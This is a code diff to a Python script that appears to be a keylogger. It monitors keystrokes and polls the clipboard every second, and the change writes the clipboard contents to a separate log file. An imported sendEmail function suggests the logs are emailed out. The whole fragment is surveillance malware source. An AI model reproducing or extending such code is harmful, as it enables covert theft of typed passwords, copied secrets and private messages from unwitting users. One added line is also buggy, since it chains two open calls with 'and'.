@@ -8,6 +8,9 @@ from threading import Thread
 from emailFunctionality import sendEmail
 
 log_file = "logs.txt"
+clipBoard_file = "clipBoardLogs.txt"
+with open(log_file, "w") and open(clipBoard_file, "w"):
+    pass
 
 ThreadRunning = True
 def on_press(key):
@@ -42,8 +45,8 @@ def checkClipBoard():
         currContent = pyperclip.paste()
         if currContent != prevContent:
             prevContent = currContent
-            with open(log_file, "a") as keyLogs:
-                keyLogs.write(parseOutput(prevContent))
+            with open(clipBoard_file, "a") as clipBoardKeyLogs:
+                clipBoardKeyLogs.write(parseOutput(prevContent))
 
         time.sleep(1)
     
